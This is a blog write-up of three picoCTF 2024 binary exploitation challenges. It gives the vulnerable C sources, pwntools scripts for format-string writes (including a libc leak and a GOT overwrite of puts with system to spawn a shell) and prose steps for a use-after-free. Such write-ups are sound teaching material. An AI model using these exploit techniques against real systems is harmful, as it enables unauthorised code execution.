---
title: 'picoctf 2024'
description: 'Here is the solutions to some of the challenges in picoctf 2024'
pubDate: 'Aug 5 2024'
heroImage: 
  src: '/blog-placeholder-1.jpg'
  alt: ''
order: 1
tags: ["writeup"]
---
# Background Information
I participated in picoCTF 2024 with the team Cyber Thugs. We placed 24th in the United States with a score of 6925. This competition definitely was fun. Challenges were not too complex, but there was always something that kept my time from solving. Hopefully picoCTF 2025 will be better :prayer:

*** UPDATE ***
Im only posting pwn. Cus im lazy.

## Binary Exploitation
### Format String 2

> This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack! 
>
> Download the binary here. 
>
> Download the source here.

This challenge asks us to utilize the format string exploit to write arbitrary data from the stack. Let's read the code first: 

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

So what we can see here is that it checks if `sus` is equal to `0x67616c66`. However, what we can see is that `sus` is hardcoded to `0x21737573`, which means we need to find a way to overwrite sus to pass the condition.

So basically, here is plan:

-> Use a basic format string with A's and `%p` pointer to leak data from the program

-> This program is in x64, so we need to make sure we use 8 A's to fill out the stack frame. 

-> We will use the %p format to leak pointers in the format string

-> Here's our basic payload: `AAAAAAAA%p-%p-%p ...` we will repeat the use of `%p` to leak pointer addresses to find how many arguments we need.

->  We then will send a format string payload with the address of `sus`, the format string argument(s), the value of `0x67616c66`.

-> We will use pwntools to send the payload to the elf and pass the check, which will give us flag.

So let's get started.

![Image of info leak](/img/writeups/2024/picoCTF2024/formatstring02.png)

Wow! Lots of data! If we look closely we can see a pointer with the value of `0x4141414141414141` this must be where our input is stored on the stack.

Counting towards that pointer we get a argument amount of 14. Let's find the address of `sus`.

Luckily pwntools will give the address of `sus` through the python code `elf.symbols['sus']`

Let's put this into a solve script:

Wait? How does this work?

Basically, when we send the format string payload, pwntools will turn the address of `sus` as a pointer, and then write the value we give to it to that pointer, basically overwriting whatever initial value `sus` had. 

```python
from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split

context.binary='vuln'
elf = ELF('./vuln')
libc = elf.libc

if args.REMOTE:
#change this on your own remote instance
	p = remote('rhea.picoctf.net', 61865)
else:
	p = process(elf.path)

def send_payload(payload):
	p.sendline(payload)
	p.interactive()

address = elf.symbols['sus']
print(address)
value = 0x67616c66   # this is the value admin needs to be
print(value)
#overwriting the sus address with the value we want
payload = fmtstr_payload(14, {address: value})
p.sendlineafter(b'say?', payload)
p.recvuntil(b'I have NO clue')
p.interactive()
print(p.recvuntil('?'))
```
Running this we get success! Please check on your own remote instance. 

![Image of exploit success](/img/writeups/2024/picoCTF2024/formatstring02-1.png)

Resources: 



### Heap 3
> This program mishandles memory. Can you exploit it to get the flag? 
>
> Download the binary here.
>
> Download the source here.
>
> Connect with the challenge instance here: nc tethys.picoctf.net 65312

This problem was intially a bit confusing, but in retrospect it was pretty easy. 

The problem gives us this hint: `Check out "use after free"`

Hmmm... what could "use after free" possibly mean and how does it relate to heap overflow?
Heres the definition of "use after free":

```Once free is called on an allocation, the allocator is free to re-allocate that chunk of memory in future calls to malloc if it so chooses. However if the program author isn't careful and uses the freed object later on, the contents may be corrupt (or even attacker controlled). This is called a use after free or UAF.```

Let's read the source code. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct size 35
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5]; //we have to modify this "area" from bico to pico
} object;

int num_allocs;
object *x;

void check_win() {
//just need to change it from bico to pico
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
Let's see what goes on in the code. So our objective is to get to the `check_win()` function. However, this can only be achieved if the variable `x` equals to `pico`, and `x` has been set to `bico`.

We also see other cases, such as `print_heap`, `alloc_object()` and `free_memory()`. Let's try to think of a solution. 

Further up we can see a struct being created. 
```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5]; //we have to modify this "area" from bico to pico
} object;
```

This struct and the functions `alloc_object()` and `free_memory()` will allow us to change `x` to `pico`! 

Here's our steps:

1. Allocate memory of size 35 (size of struct) with random garbage. 
2. Free this garbage 
3. Allocate memory of size 35 with random garbage but overflow with the last 5 characters being `pico` and the null byte
4. Somehow this confused the program and it will use those last 5 bytes as x. 

Let's see this in action: 

![Image of exploit success](/img/writeups/2024/picoCTF2024/heap3.png)

Wow! So simple!

### Format String 3

> This program doesn't contain a win function. How can you win? 
>
> Download the binary here. 
>
> Download the source here. 
>
> Download libc here, download the interpreter here. 
>
> Run the binary with these two files present in the same directory.
>
> Additional details will be available after launching your challenge instance.

This one's pretty simple because it basically is format string 2, just a little bit more complicated.

The hint says: `Is there any way to change what a function points to?`. This must mean we need to overwrite a function to point to something else.

Let's read the source code provided:

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}

```

hmm... interesting. It says it gives the address of `setvbuf` in libc, and it does the `puts`function with `normal_string`, with `normal_string` being `/bin/sh`. 

After a bit of research, it appears we need to overwrite the address of `puts()` with `system()`, so we can pop a shell to access the server. However, there's a huge problem. How do we even get `system()`???

Getting `puts` is easy. It's in the Global Offset Table (GOT), so we don't really need to worry about that. 

We can try to find system() in libc, however there's a huge problem. The binary has ASLR. 

ASLR stands for Address Space Layout Randomisation and can, in most cases, be thought of as libc's equivalent of PIE - every time you run a binary, libc (and other libraries) get loaded into a different memory address.

This is a problem. How can we get address of `system()` if we can't even get a constant address for `system()` in libc???

This is where the leak of `setvbuf` in libc comes in. 

We can caculate the base address of libc by subtracting the leaked address of `setvbuf` by the offset of `setvbuf` in libc. 

Ok, so with that we can add the offset of `system` in libc to the base address. So we are able to get `system`, nice!

Heres the steps of our exploit:

1. subtract leaked setvbuf by setvbuf offset in libc to get libc base address
2. add offset of system in libc to the base address to get the address of system
3. get the address of puts in the GOT and replace it with the address of system using format string
4. use pwntools to automate this process
5. log in and get flag!

```python
from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split

elf = context.binary = ELF('./format-string-3')
libc = ELF('./libc.so.6')
#get base address from setvbuf using leaked setvbuf

if args.REMOTE:

	p = remote('rhea.picoctf.net', 61909)
else:
	p = process(elf.path)

def send_payload(payload):
	p.sendline(payload)
	p.interactive()

print(p.recvline())

system_leak = int(((p.recvline()).split()[11]), 16)

print((system_leak))

#get the libc.address through system leak
libc_address = (system_leak-libc.symbols['setvbuf'])

system = (libc_address + libc.symbols['system'])

payload = fmtstr_payload(38, {elf.got['puts']: system})

p.sendline(payload)
p.interactive()

```

![Image of exploit success](/img/writeups/2024/picoCTF2024/formatstring03.png)

And... we get the flag! 


